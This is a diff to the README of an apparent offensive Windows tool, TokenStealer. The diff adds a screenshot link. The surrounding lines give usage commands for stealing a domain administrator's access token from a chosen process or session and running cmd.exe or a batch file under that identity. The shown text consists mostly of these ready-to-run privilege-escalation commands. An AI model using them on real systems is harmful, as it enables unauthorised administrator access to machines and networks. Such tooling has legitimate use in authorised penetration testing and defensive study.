@@ -23,6 +23,8 @@ TokenStealer.exe<br>
 <br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\bind.bat  -p 100 -t </b>-> steal token of the user in process 100 and execute the batch file using Impersonation privilege instead of AssingPrimary<br>
 <br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -b 1 </b>-> steal a primary token of the user and execute an interactive  command shell using the AssingPrimary privilege if available<br>
 <br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -s 2 </b>-> steal a token of the user in specific SessionID and execute an interactive  command shell using the AssingPrimary privilege if available<be>
+<img src="https://github.com/decoder-it/TokenStealer/blob/master/Capture.PNG" alt="Alt text" title="Optional title">
+
 
 
 
